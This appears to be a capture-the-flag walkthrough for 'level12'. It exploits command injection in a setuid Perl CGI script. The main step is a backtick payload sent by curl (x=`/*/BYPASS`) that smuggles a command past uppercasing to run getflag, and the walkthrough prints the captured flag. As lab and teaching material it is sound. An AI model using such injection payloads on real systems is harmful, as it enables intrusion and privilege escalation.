# level12

## Steps

1. __Action__ (Guest): list the files present at the root
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals one intersting file
    `level12.pl`
    ```
    .bash_logout  .bashrc  level12.pl  .profile
    ```

3. __Action__ (Guest): get more information about the `level12.pl` file
    ```sh
    getfacl level12.pl
    ```

4. __Observation__ (Guest): the previous command reveals that
    the `level12.pl` file:
    - is owned by the `flag12` user
    - is readable and executable by the `level12` and `flag12` users
	- has the `setuid` bit and the `setgid` bit enabled
    ```
    # file: level12.pl
    # owner: flag12
    # group: level12
    # flags: ss-
    user::rwx
    group::r-x
    group:flag12:rwx		#effective:r-x
    mask::r-x
    other::r-x
    ```

5. __Action__ (Guest): check the contents of the `level12.pl` file
    ```sh
    cat level12.pl
    ```

6. __Observation__ (Guest): the previous command reveals
    - there are two subroutines
    - the first subroutine takes two parameters, converts the first parameter
    to uppercase, and truncates it at the first white space
    but does nothing with the second parameter
    ```perl
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
    }

    sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
    }

    n(t(param("x"), param("y")));
    ```
    The password can be collected if we exploit the vulnerability present in
    the command stored in `@output`.

7. __Action__ (Guest): exploit the vulnerability in the script
    We understand that the parameter passed will be converted to uppercase so 
    we can't pass the `getflag` command. What we'll do is passing a script
    which executes the `getflag` command.
    The first step is to create a file with the command we want to execute
    ```sh
    echo "getflag | grep -oE '[^ ]+$' > /tmp/token" > /tmp/BYPASS
    ```

7. __Action__ (Guest): exploit the vulnerability in the script
    The second step is to make our file executable by altering its rights
    ```sh
    chmod +x /tmp/BYPASS
    ```

8. __Action__ (Guest): exploit the vulnerability in the script
    Once the two previous steps are done, we can pass our script to the server
    ```sh
    curl localhost:4646 -d 'x=`/*/BYPASS`'
    ```

9. __Action__ (Guest): Collect the flag
    We can now collect the token present at the `/tmp/token` file
    ```sh
    cat /tmp/token
    ```

8. __Observation__ (Guest): the last command reveals the flag for this level
    ```
    g1qKMiRpXf53AWhDaU7FEkczr
    ```
